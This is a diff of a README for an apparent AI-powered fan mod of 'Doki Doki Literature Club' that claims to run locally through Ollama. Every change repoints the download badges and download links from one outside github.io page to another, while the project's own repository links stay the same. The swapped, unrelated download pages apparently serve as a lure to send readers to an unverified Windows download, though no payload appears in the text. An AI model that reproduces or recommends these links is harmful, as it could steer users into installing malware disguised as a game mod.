@@ -2,9 +2,9 @@
 
 # Doki Doki Literature Club — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://phantommofence.github.io/download-win/)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://phantommofence.github.io/download-win/)
-[![Four club members, fully unscripted](https://img.shields.io/badge/Club-Members-4-ff7fbf?style=for-the-badge)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![Four club members, fully unscripted](https://img.shields.io/badge/Club-Members-4-ff7fbf?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/CentiSupport/ddlc-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/CentiSupport/ddlc-ai-edition)
@@ -55,7 +55,7 @@ Ask Sayori how she actually slept. Argue with Natsuki about whether manga is lit
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://phantommofence.github.io/download-win/)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://phantommofence.github.io/download-win/)**
+- **[⬇ Download the latest version](https://beatowlrouse.github.io/windownload/)**
 - [Repository](https://github.com/CentiSupport/ddlc-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
